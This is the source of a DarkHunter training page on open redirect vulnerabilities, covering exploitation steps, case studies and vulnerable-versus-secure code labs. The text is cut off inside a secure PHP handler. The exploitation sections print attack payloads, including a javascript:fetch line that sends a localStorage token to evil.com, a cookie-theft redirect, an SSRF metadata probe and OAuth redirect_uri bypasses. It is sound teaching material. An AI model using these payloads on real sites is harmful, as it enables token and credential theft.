<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;

?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="Master Open Redirect vulnerabilities - Understanding unvalidated redirect attacks and implementing robust defenses. Complete cybersecurity training module.">
  <title>Open Redirect - Complete Guide | DarkHunter</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/open-redirect-info.css?v=1.1">

</head>

<body>
  <div class="grid-bg"></div>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>
  <div class="app-container">
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>

    <aside class="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-brand">
          👾 <span>DARK</span>HUNTER
        </div>
      </div>

      <div class="nav-section">
        <div class="nav-title">Navigation</div>
        <ul class="nav-links">
          <li><a href="#overview" class="active"><i>📚</i> Overview</a></li>
          <li><a href="#mechanism"><i>⚙️</i> How It Works</a></li>
          <li><a href="#exploitation"><i>🎯</i> Exploitation Steps</a></li>
          <li><a href="#impact"><i>💥</i> Real-World Impact</a></li>
          <li><a href="#labs"><i>💻</i> Code Labs</a></li>
          <li><a href="#bypass"><i>🚧</i> Bypass Techniques</a></li>
          <li><a href="#mitigation"><i>🛡️</i> Prevention</a></li>
        </ul>
      </div>

      <div class="nav-section">
        <div class="nav-title">Related Modules</div>
        <ul class="nav-links">
          <li><a href="/DarkHunter/learningBugs/xss-info.php"><i>💻</i> XSS</a></li>
          <li><a href="/DarkHunter/learningBugs/sqli-info.php"><i>🗃️</i> SQL Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/csrf-info.php"><i>🧬</i> CSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/idor-info.php"><i>🆔</i> IDOR</a></li>
          <li><a href="/DarkHunter/learningBugs/jwt-info.php"><i>🎫</i> JWT</a></li>
          <li><a href="/DarkHunter/learningBugs/ssrf-info.php"><i>🌐</i> SSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/ssti-info.php"><i>🧪</i> SSTI</a></li>
          <li><a href="/DarkHunter/learningBugs/cors-info.php"><i>🔗</i> CORS</a></li>
          <li><a href="/DarkHunter/learningBugs/file-upload-info.php"><i>📤</i> File Upload</a></li>
          <li><a href="/DarkHunter/learningBugs/cache-poisoning-info.php"><i>🧃</i> Cache Poisoning</a></li>
          <li><a href="/DarkHunter/learningBugs/host-header-info.php"><i>🖥️</i> Host Header Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/oauth-info.php"><i>🔑</i> OAUTH</a></li>
          <li><a href="/DarkHunter/learningBugs/http-smuggling-info.php"><i>📦</i> HTTP Smuggling</a></li>
          <li><a href="/DarkHunter/learningBugs/html-injection-info.php"><i>📝</i> HTML Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/lfi-info.php"><i>📁</i> LFI</a></li>
          <li><a href="/DarkHunter/learningBugs/rce-info.php"><i>💻</i> RCE</a></li>
          <li><a href="/DarkHunter/learningBugs/race-condition-info.php"><i>⚡</i> Race Condition</a></li>
        </ul>
      </div>
    </aside>

    <main class="main-content">
      <div class="page-header">
        <h1 class="page-title">Open Redirect</h1>
        <p class="page-subtitle">
          Master Open Redirect vulnerabilities - Learn how attackers exploit unvalidated redirect parameters to phish
          users, steal credentials, and bypass security controls. Understand URL parsing intricacies and implement
          bulletproof validation.
        </p>
      </div>

      <div class="content-card">
        <div class="toc">
          <div class="toc-title">📋 Table of Contents</div>
          <ul class="toc-list">
            <li><a href="#overview">1. What is Open Redirect?</a></li>
            <li><a href="#mechanism">2. Technical Mechanism</a></li>
            <li><a href="#exploitation">3. Exploitation Steps</a></li>
            <li><a href="#impact">4. Real-World Impact</a></li>
            <li><a href="#labs">5. Code Labs: Vulnerable vs Secure</a></li>
            <li><a href="#bypass">6. Bypass Techniques</a></li>
            <li><a href="#mitigation">7. Prevention Checklist</a></li>
          </ul>
        </div>
      </div>

      <div id="overview" class="content-card">
        <h2 class="card-title"><i>📚</i> What is Open Redirect?</h2>

        <div class="highlight-box">
          <strong>Definition:</strong> An Open Redirect vulnerability occurs when an application accepts user-controlled
          input that specifies a URL to redirect to, without proper validation. This allows attackers to redirect users
          from a legitimate domain to a malicious one, bypassing trust boundaries and enabling phishing, credential
          theft, and malware distribution.
        </div>

        <p class="text-content">
          Open redirects are often dismissed as "low severity" because they don't directly expose data. However, they
          serve as critical enablers for high-impact attacks. When users see a trusted domain (like
          <code>bank.com</code>) in the address bar, they trust the site—even when the page immediately redirects to
          <code>evil.com</code> that harvests credentials. This trust abuse makes open redirects devastatingly effective
          in social engineering campaigns.
        </p>

        <div class="danger-box">
          <strong>⚠️ Critical Impact:</strong> Open Redirects are force multipliers for phishing. They enable:
          credential harvesting via fake login pages, OAuth token theft (stealing authorization codes), malware
          distribution through trusted links, bypass of referrer checks and CSRF protections, and JavaScript execution
          via data/protocol URIs (javascript:, data:text/html). A single redirect can compromise thousands of users.
        </div>

        <h3 class="subsection-title">CVSS Severity Assessment</h3>
        <div style="margin: 1rem 0;">
          <span class="severity-badge severity-medium">CVSS 6.1 (Medium)</span>
          <span class="severity-badge severity-high">CVSS 8.2 (High with OAuth)</span>
        </div>
        <div class="highlight-box">
          <strong>CVSS v3.1 Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Attack Vector (AV):</strong> Network - Exploitable via crafted URLs</li>
            <li><strong>Attack Complexity (AC):</strong> Low - Simple parameter manipulation</li>
            <li><strong>Privileges Required (PR):</strong> None - No authentication needed</li>
            <li><strong>User Interaction (UI):</strong> Required - Victim must click malicious link</li>
            <li><strong>Scope (S):</strong> Changed - Redirects to attacker-controlled domain</li>
            <li><strong>Impact:</strong> Low Confidentiality (phishing), Medium when chained with OAuth</li>
          </ul>
        </div>

        <h3 class="subsection-title">Types of Open Redirect</h3>
        <div class="redirect-type-grid">
          <div class="redirect-type-card">
            <div class="redirect-type-name">Parameter-Based</div>
            <div class="redirect-type-desc">?redirect=, ?url=, ?next=, ?return= parameters in URL</div>
          </div>
          <div class="redirect-type-card">
            <div class="redirect-type-name">Header-Based</div>
            <div class="redirect-type-desc">Location, Referer, Origin header manipulation</div>
          </div>
          <div class="redirect-type-card">
            <div class="redirect-type-name">DOM-Based</div>
            <div class="redirect-type-desc">JavaScript redirects via location.href, window.open()</div>
          </div>
          <div class="redirect-type-card">
            <div class="redirect-type-name">Protocol/Schema</div>
            <div class="redirect-type-desc">javascript:, data:, file:, smb: protocol abuse</div>
          </div>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">📊 Open Redirect Attack Flow</div>
          <div class="attack-flow" style="margin: 0;">
            <div class="flow-step">
              <div class="flow-icon attack">📧</div>
              <div class="flow-label">Phishing Email</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Link to
                trusted.com/redirect?url=evil.com</p>
            </div>
            <div class="flow-step">
              <div class="flow-icon victim">👤</div>
              <div class="flow-label">Victim Clicks</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Sees trusted.com in URL</p>
            </div>
            <div class="flow-step">
              <div class="flow-icon server">↪️</div>
              <div class="flow-label">Redirect</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">HTTP 302 to evil.com</p>
            </div>
            <div class="flow-step">
              <div class="flow-icon attack">🔑</div>
              <div class="flow-label">Credential Theft</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Fake login page harvests data
              </p>
            </div>
          </div>
        </div>
      </div>

      <div id="mechanism" class="content-card">
        <h2 class="card-title"><i>⚙️</i> How Open Redirect Works: Technical Deep Dive</h2>

        <h3 class="subsection-title">The Vulnerability Pattern</h3>
        <p class="text-content">
          Open redirects occur when applications use user input to construct redirect destinations without validating
          that the target is legitimate. The vulnerability spans server-side redirects (HTTP 3xx responses) and
          client-side redirects (JavaScript/meta refresh).
        </p>

        <div class="highlight-box">
          <strong>Common Vulnerable Patterns:</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li>Login flows: <code>/login?redirect=/dashboard</code> → redirect to arbitrary domain after auth</li>
            <li>Logout handlers: <code>/logout?return=</code> → redirect anywhere after session termination</li>
            <li>OAuth callbacks: <code>/oauth/callback?redirect=</code> → steal authorization codes</li>
            <li>Legacy URL shorteners: <code>/go?url=</code> → open redirect as "feature"</li>
            <li>Mobile app deep links: <code>/redirect?target=</code> → app-to-web transitions</li>
          </ul>
        </div>

        <h3 class="subsection-title">Server-Side Redirect Mechanisms</h3>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Vulnerable Server-Side Redirects</span></div>
          <pre><code><span class="code-comment">-- PHP: Direct header() manipulation</span>
<span class="code-keyword">&lt;?php</span>
<span class="code-keyword">$redirect</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'url'</span>];
<span class="code-function">header</span>(<span class="code-string">"Location: "</span> . <span class="code-keyword">$redirect</span>);  <span class="code-comment">-- No validation!</span>
<span class="code-keyword">exit</span>;
<span class="code-keyword">?&gt;</span>

<span class="code-comment">-- Node.js/Express</span>
app.<span class="code-function">get</span>(<span class="code-string">'/redirect'</span>, (req, res) => {
    res.<span class="code-function">redirect</span>(req.query.url);  <span class="code-comment">-- Direct user input</span>
});

<span class="code-comment">-- Python/Django</span>
<span class="code-keyword">def</span> <span class="code-function">redirect_view</span>(request):
    <span class="code-keyword">return</span> redirect(request.GET.<span class="code-function">get</span>(<span class="code-string">'next'</span>))  <span class="code-comment">-- Unvalidated</span>

<span class="code-comment">-- Java/Spring</span>
<span class="code-keyword">@GetMapping</span>(<span class="code-string">"/redirect"</span>)
<span class="code-keyword">public</span> String <span class="code-function">redirect</span>(<span class="code-keyword">@RequestParam</span> String url) {
    <span class="code-keyword">return</span> <span class="code-string">"redirect:"</span> + url;  <span class="code-comment">-- Direct concatenation</span>
}</code></pre>
        </div>

        <h3 class="subsection-title">Client-Side (DOM) Redirects</h3>
        <p class="text-content">
          JavaScript-based redirects are equally dangerous and often bypass server-side protections entirely.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Vulnerable Client-Side Redirects</span></div>
          <pre><code><span class="code-comment">-- JavaScript direct assignment</span>
<span class="code-keyword">window</span>.location = location.search.<span class="code-function">split</span>(<span class="code-string">'url='</span>)[<span class="code-number">1</span>];

<span class="code-comment">-- jQuery mobile (common in older apps)</span>
$.mobile.<span class="code-function">changePage</span>(<span class="code-keyword">$</span>(<span class="code-string">'#redirect-select'</span>).<span class="code-function">val</span>());

<span class="code-comment">-- React Router (v5)</span>
<span class="code-keyword">const</span> { search } = <span class="code-function">useLocation</span>();
<span class="code-keyword">const</span> params = <span class="code-keyword">new</span> <span class="code-function">URLSearchParams</span>(search);
<span class="code-keyword">return</span> <span class="code-tag">&lt;Redirect</span> <span class="code-attr">to</span>=<span class="code-string">{params.get('to')}</span> <span class="code-tag">/&gt;</span>;

<span class="code-comment">-- Angular</span>
<span class="code-keyword">constructor</span>(<span class="code-keyword">private</span> router: Router, <span class="code-keyword">private</span> route: ActivatedRoute) {}
<span class="code-function">ngOnInit</span>() {
    <span class="code-keyword">this</span>.route.queryParams.<span class="code-function">subscribe</span>(params => {
        <span class="code-keyword">this</span>.router.<span class="code-function">navigate</span>([params[<span class="code-string">'returnUrl'</span>]]);  <span class="code-comment">-- Dangerous</span>
    });
}</code></pre>
        </div>

        <h3 class="subsection-title">URL Parsing Complexity</h3>
        <p class="text-content">
          URL parsers behave differently across languages and libraries, creating bypass opportunities. Understanding
          URL components is critical for proper validation.
        </p>

        <div class="url-visualizer">
          <div style="margin-bottom: 0.5rem; color: var(--text-muted); font-size: 0.8rem;">URL Structure Analysis:</div>
          <div>
            <span class="url-safe">https://</span><span class="url-danger">attacker.com</span><span
              class="url-safe">@</span><span class="url-safe">bank.com</span><span
              class="url-safe">/login?redirect=</span><span class="url-danger">evil.com</span>
          </div>
          <div style="margin-top: 1rem; font-size: 0.85rem; color: var(--text-secondary);">
            Many parsers see <code>attacker.com@bank.com</code> as the host, but browsers interpret
            <code>attacker.com</code> as username and <code>bank.com</code> as host—yet the redirect still goes to
            evil.com!
          </div>
        </div>

        <div class="code-block">
          <div class="code-header"><span class="code-label">URL Parsing Differences</span></div>
          <pre><code><span class="code-comment">-- URL: https://attacker.com@bank.com/redirect?url=evil.com</span>

<span class="code-comment">-- PHP parse_url()</span>
<span class="code-function">parse_url</span>(<span class="code-string">"https://attacker.com@bank.com/redirect"</span>)
<span class="code-comment">-- ['host' => 'bank.com', 'user' => 'attacker.com'] ✓ Correct</span>

<span class="code-comment">-- But simple string checks fail:</span>
<span class="code-keyword">if</span> (<span class="code-function">strpos</span>(<span class="code-keyword">$url</span>, <span class="code-string">'bank.com'</span>) !== <span class="code-keyword">false</span>) {
    <span class="code-comment">-- TRUE! Contains bank.com, but redirects to attacker.com</span>
}

<span class="code-comment">-- Python urllib</span>
<span class="code-keyword">from</span> urllib.parse <span class="code-keyword">import</span> urlparse
<span class="code-function">urlparse</span>(<span class="code-string">"https://attacker.com@bank.com/path"</span>)
<span class="code-comment">-- ParseResult(scheme='https', netloc='attacker.com@bank.com', ...)</span>
<span class="code-comment">-- urlparse().hostname == 'bank.com' (correct)</span>
<span class="code-comment">-- urlparse().netloc == 'attacker.com@bank.com' (dangerous if used)</span>

<span class="code-comment">-- JavaScript URL()</span>
<span class="code-keyword">new</span> <span class="code-function">URL</span>(<span class="code-string">"https://attacker.com@bank.com/path"</span>).hostname
<span class="code-comment">-- "bank.com" ✓ Correct</span>
<span class="code-keyword">new</span> <span class="code-function">URL</span>(<span class="code-string">"https://attacker.com@bank.com/path"</span>).href
<span class="code-comment">-- "https://attacker.com@bank.com/path" (preserves auth)</span></code></pre>
        </div>

        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-icon attack">🔗</div>
            <div class="flow-label">Craft URL</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">bank.com/redirect?url=evil.com
            </p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">🧪</div>
            <div class="flow-label">Validation Bypass</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">String contains check passes
            </p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">↪️</div>
            <div class="flow-label">HTTP 302</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Location: evil.com</p>
          </div>
          <div class="flow-icon attack">🎣</div>
          <div class="flow-label">Phishing Success</div>
          <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">User trusts, enters credentials
          </p>
        </div>
      </div>


      <div id="exploitation" class="content-card">
        <h2 class="card-title"><i>🎯</i> Exploitation Steps: Finding and Exploiting Open Redirects</h2>

        <h3 class="subsection-title">Step 1: Identify Redirect Parameters</h3>
        <p class="text-content">
          Map all endpoints that accept URL parameters and trigger redirects. Common parameter names include: redirect,
          url,
          return, returnUrl, next, target, destination, goto, callback, continue, return_to.
        </p>

        <div class="highlight-box">
          <strong>Burp Suite Discovery:</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li>Add <code>redirect</code> parameter to all GET requests, set value to your collaborator/interactsh
              domain
            </li>
            <li>Use Burp Scanner with "Open Redirect" detection enabled</li>
            <li>Check for 302/301 responses with Location headers containing your domain</li>
            <li>Review JavaScript files for <code>window.location</code> assignments</li>
          </ul>
        </div>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Parameter Discovery Script</span></div>
          <pre><code><span class="code-comment">-- Common redirect parameters to test</span>
<span class="code-keyword">params</span>=[
    <span class="code-string">'redirect'</span>, <span class="code-string">'redirect_to'</span>, <span class="code-string">'redirect_url'</span>,
    <span class="code-string">'url'</span>, <span class="code-string">'return'</span>, <span class="code-string">'returnUrl'</span>, <span class="code-string">'return_to'</span>,
    <span class="code-string">'next'</span>, <span class="code-string">'target'</span>, <span class="code-string">'destination'</span>, <span class="code-string">'goto'</span>,
    <span class="code-string">'callback'</span>, <span class="code-string">'continue'</span>, <span class="code-string">'to'</span>, <span class="code-string">'link'</span>,
    <span class="code-string">'out'</span>, <span class="code-string">'view'</span>, <span class="code-string">'r'</span>, <span class="code-string">'u'</span>, <span class="code-string">'redir'</span>
]

<span class="code-comment">-- Test each parameter</span>
<span class="code-keyword">for</span> param <span class="code-keyword">in</span> <span class="code-string">${params[@]}</span>; <span class="code-keyword">do</span>
    curl -s -o /dev/null -w <span class="code-string">"%{http_code} %{redirect_url}\n"</span> \
         <span class="code-string">"https://target.com/login?$param=https://evil.com"</span>
<span class="code-keyword">done</span>

<span class="code-comment">-- Look for 302/301 with Location: https://evil.com</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 2: Test Basic Redirect</h3>
        <p class="text-content">
          Confirm the redirect works with a simple external domain. If blocked, proceed to bypass techniques.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Basic Exploitation Test</span></div>
          <pre><code><span class="code-comment">-- Test 1: Direct external domain</span>
<span class="code-keyword">GET</span> <span class="code-string">/login?redirect=https://evil.com</span> <span class="code-keyword">HTTP/1.1</span>

<span class="code-comment">-- Expected: 302 Location: https://evil.com</span>

<span class="code-comment">-- Test 2: Protocol-relative URL</span>
<span class="code-keyword">GET</span> <span class="code-string">/login?redirect=//evil.com</span> <span class="code-keyword">HTTP/1.1</span>

<span class="code-comment">-- Test 3: Path-only (should fail or redirect internally)</span>
<span class="code-keyword">GET</span> <span class="code-string">/login?redirect=/dashboard</span> <span class="code-keyword">HTTP/1.1</span>

<span class="code-comment">-- Test 4: JavaScript protocol (for DOM-based)</span>
<span class="code-keyword">GET</span> <span class="code-string">/login?redirect=javascript:alert(1)</span> <span class="code-keyword">HTTP/1.1</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 3: OAuth Token Theft via Redirect</h3>
        <p class="text-content">
          Open redirects in OAuth flows are critical—they allow stealing authorization codes and access tokens by
          redirecting to attacker-controlled URIs.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">OAuth Redirect Attack</span></div>
          <pre><code><span class="code-comment">-- Legitimate OAuth flow:</span>
<span class="code-string">https://provider.com/oauth/authorize?</span>
    <span class="code-attr">client_id</span>=<span class="code-string">123&</span>
    <span class="code-attr">redirect_uri</span>=<span class="code-string">https://app.com/callback&</span>
    <span class="code-attr">response_type</span>=<span class="code-string">code</span>

<span class="code-comment">-- Attacker modifies redirect_uri parameter:</span>
<span class="code-string">https://provider.com/oauth/authorize?</span>
    <span class="code-attr">client_id</span>=<span class="code-string">123&</span>
    <span class="code-attr">redirect_uri</span>=<span class="code-string">https://app.com/callback?next=https://evil.com&</span>
    <span class="code-attr">response_type</span>=<span class="code-string">code</span>

<span class="code-comment">-- If app.com/callback has open redirect:</span>
<span class="code-comment">-- 1. User authorizes app</span>
<span class="code-comment">-- 2. Provider redirects to app.com/callback?next=evil.com&code=AUTH_CODE</span>
<span class="code-comment">-- 3. app.com/callback receives code, then redirects to evil.com?code=AUTH_CODE</span>
<span class="code-comment">-- 4. Attacker steals authorization code!</span>

<span class="code-comment">-- Even "strict" redirect_uri validation can fail:</span>
<span class="code-string">redirect_uri=https://app.com/callback.evil.com</span>  <span class="code-comment">-- Subdomain bypass</span>
<span class="code-string">redirect_uri=https://app.com/callback@evil.com</span>  <span class="code-comment">-- Userinfo bypass</span>
<span class="code-string">redirect_uri=https://app.com/callback%23@evil.com</span>  <span class="code-comment">-- Fragment bypass</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 4: DOM-Based Redirect Exploitation</h3>
        <p class="text-content">
          Client-side redirects often bypass server-side protections entirely. Test JavaScript execution contexts.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">DOM Redirect Payloads</span></div>
          <pre><code><span class="code-comment">-- location.hash manipulation</span>
<span class="code-string">https://target.com/page#redirect=javascript:alert(document.cookie)</span>

<span class="code-comment">-- URLSearchParams exploitation</span>
<span class="code-string">https://target.com/page?return=data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</span>

<span class="code-comment">-- postMessage redirect (advanced)</span>
<span class="code-string">https://target.com/page?target=javascript:fetch('https://evil.com/?c='+localStorage.token)</span>

<span class="code-comment">-- Single Page Application (SPA) router hijack</span>
<span class="code-string">https://target.com/#/redirect?to=//evil.com</span>

<span class="code-comment">-- Angular $location exploitation</span>
<span class="code-string">https://target.com/?returnPath=%2F..%2F..%2Fevil.com</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 5: Chaining for Maximum Impact</h3>
        <p class="text-content">
          Combine open redirect with other vulnerabilities for greater effect: XSS via javascript: protocol, SSRF via
          redirect to internal services, and filter bypass for other attacks.
        </p>

        <div class="highlight-box">
          <strong>Advanced Chains:</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>XSS:</strong> <code>?redirect=javascript:alert(1)</code> or
              <code>data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</code>
            </li>
            <li><strong>SSRF:</strong> <code>?redirect=http://169.254.169.254/</code> (if server follows redirect)</li>
            <li><strong>Cookie Theft:</strong> <code>?redirect=//evil.com/?c=</code> + document.cookie via JS</li>
            <li><strong>Referrer Leak:</strong> Redirect through multiple hops to strip referrer, then to final target
            </li>
          </ul>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Open Redirect to Account Takeover</div>
          <div class="diagram-placeholder">
            <i>▶️</i><br>
            [Insert Video: OAuth flow exploitation → token theft → account takeover demonstration]
          </div>
        </div>
      </div>

      <div id="impact" class="content-card">
        <h2 class="card-title"><i>💥</i> Real-World Impact: Notorious Open Redirect Breaches</h2>

        <h3 class="subsection-title">Case Study 1: Facebook OAuth Redirect Attack (2018)</h3>
        <p class="text-content">
          Security researcher Inti De Ceukelaire discovered that Facebook's OAuth implementation allowed open redirects
          through the <code>next</code> parameter. Combined with Facebook's "Login with Facebook" feature, attackers
          could
          steal access tokens for any application.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Attackers could construct links that appeared as legitimate Facebook login pages but
          redirected to attacker-controlled domains after authentication, stealing OAuth tokens for Instagram, Spotify,
          Airbnb, and thousands of other Facebook-connected apps. Affected millions of potential users.
        </div>

        <h3 class="subsection-title">Case Study 2: Google Gmail Redirect Phishing (2020)</h3>
        <p class="text-content">
          Attackers exploited open redirects in Google's authentication flow to create convincing phishing campaigns.
          The
          URLs started with <code>https://accounts.google.com</code> and included legitimate-looking parameters, but
          redirected to credential harvesting sites.
        </p>
        <div class="warning-box">
          <strong>Attack Chain:</strong> accounts.google.com/ServiceLogin?continue=https://mail.google.com → manipulated
          to
          → accounts.google.com/ServiceLogin?continue=https://evil.com/gmail (visual spoofing). Users saw "google.com"
          in
          the address bar throughout the process.
        </div>

        <h3 class="subsection-title">Case Study 3: Microsoft 365 Login Redirect (2021)</h3>
        <p class="text-content">
          Microsoft's login.live.com endpoint contained an open redirect that allowed bypassing of Safe Links
          protection.
          Attackers could send emails with links that passed through Microsoft's security scanning but ultimately
          redirected
          to malicious sites.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Bypassed enterprise email security controls. Attackers used this to target corporate
          users with spear-phishing campaigns that appeared to come from legitimate Microsoft infrastructure. Affected
          Fortune 500 companies using Microsoft 365.
        </div>

        <h3 class="subsection-title">Case Study 4: TikTok Mass Phishing (2022)</h3>
        <p class="text-content">
          Security researchers found multiple open redirects in TikTok's domain (tiktok.com). These were used to create
          short URLs that appeared trustworthy but redirected to phishing sites targeting TikTok creators' credentials.
        </p>
        <div class="highlight-box">
          <strong>Scale:</strong> TikTok's short URL service (vm.tiktok.com) combined with open redirects allowed
          attackers
          to distribute links via the platform's own messaging system, bypassing link filters and reaching millions of
          users
          organically.
        </div>

        <h3 class="subsection-title">Industry Impact Summary</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-cyan);">Industry</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Attack Scenario</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Potential Damage</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">SaaS/Identity</td>
              <td style="padding: 0.75rem;">OAuth redirect URI manipulation</td>
              <td style="padding: 0.75rem;">Mass account takeover, data breach</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Finance</td>
              <td style="padding: 0.75rem;">Post-login redirect to fake banking site</td>
              <td style="padding: 0.75rem;">Credential theft, financial fraud</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">E-Commerce</td>
              <td style="padding: 0.75rem;">Checkout redirect to malicious payment page</td>
              <td style="padding: 0.75rem;">Payment data theft, order fraud</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Enterprise</td>
              <td style="padding: 0.75rem;">SSO redirect to fake corporate login</td>
              <td style="padding: 0.75rem;">Domain compromise, lateral movement</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Social Media</td>
              <td style="padding: 0.75rem;">Profile link redirect to malware</td>
              <td style="padding: 0.75rem;">Botnet recruitment, disinformation</td>
            </tr>
          </table>
        </div>
      </div>

      <div id="labs" class="content-card">
        <h2 class="card-title"><i>💻</i> Code Labs: Vulnerable vs Secure Implementation</h2>

        <div class="warning-box">
          <strong>🎯 Lab Objective:</strong> Understand how improper URL validation enables open redirects, then
          implement
          strict allowlist validation, proper URL parsing, and safe redirect handling.
        </div>

        <h3 class="subsection-title">Lab 1: Basic Redirect Vulnerability (PHP)</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Direct use of user input in Location header without validation.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable PHP Code</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Vulnerable: Direct user input in redirect</span>
<span class="code-keyword">$redirect_url</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'return'</span>] ?? <span class="code-string">'/home'</span>;

<span class="code-comment">// DANGEROUS: No validation of $redirect_url</span>
<span class="code-function">header</span>(<span class="code-string">"Location: "</span> . <span class="code-keyword">$redirect_url</span>);
<span class="code-keyword">exit</span>;

<span class="code-comment">-- Attacker sends: ?return=https://evil.com</span>
<span class="code-comment">-- Result: 302 Location: https://evil.com</span>

<span class="code-comment">-- Even "safe" looking code can fail:</span>
<span class="code-keyword">if</span> (<span class="code-function">strpos</span>(<span class="code-keyword">$redirect_url</span>, <span class="code-string">'http'</span>) === <span class="code-number">0</span>) {
    <span class="code-function">header</span>(<span class="code-string">"Location: "</span> . <span class="code-keyword">$redirect_url</span>);  <span class="code-comment">-- Still vulnerable!</span>
}

<span class="code-comment">-- Bypass: ?return=http://legit.com.evil.com</span>
<span class="code-comment">-- Bypass: ?return=http://evil.com/?x=http://legit.com</span>
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Implementation</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">class</span> <span class="code-function">SecureRedirectHandler</span> {
    <span class="code-keyword">private</span> <span class="code-keyword">$allowed_hosts</span>;
    <span class="code-keyword">private</span> <span class="code-keyword">$allowed_schemes</span>;
    
    <span class="code-keyword">public function</span> <span class="code-function">__construct</span>() {
        <span class="code-comment">// Strict allowlist - only these domains allowed</span>
        <span class="code-keyword">$this</span>->allowed_hosts = [
            <span class="code-string">'example.com'</span>,
            <span class="code-string">'www.example.com'</span>,
            <span class="code-string">'app.example.com'</span>,
            <span class="code-string">'subdomain.example.com'</span>
        ];
        
        <span class="code-keyword">$this</span>->allowed_schemes = [<span class="code-string">'https'</span>];
    }
    
    <span class="code-comment">/**
     * Validates and sanitizes redirect URL
     * Returns safe URL or null if invalid
     */</span>
    <span class="code-keyword">public function</span> <span class="code-function">validateRedirect</span>(<span class="code-keyword">$url</span>) {
        <span class="code-comment">// Reject empty/invalid input</span>
        <span class="code-keyword">if</span> (!<span class="code-function">is_string</span>(<span class="code-keyword">$url</span>) || <span class="code-function">empty</span>(<span class="code-keyword">$url</span>)) {
            <span class="code-keyword">return</span> <span class="code-keyword">null</span>;
        }
        
        <span class="code-comment">// Decode any URL encoding to prevent bypasses</span>
        <span class="code-keyword">$url</span> = <span class="code-function">urldecode</span>(<span class="code-keyword">$url</span>);
        
        <span class="code-comment">// Parse URL components</span>
        <span class="code-keyword">$parsed</span> = <span class="code-function">parse_url</span>(<span class="code-keyword">$url</span>);
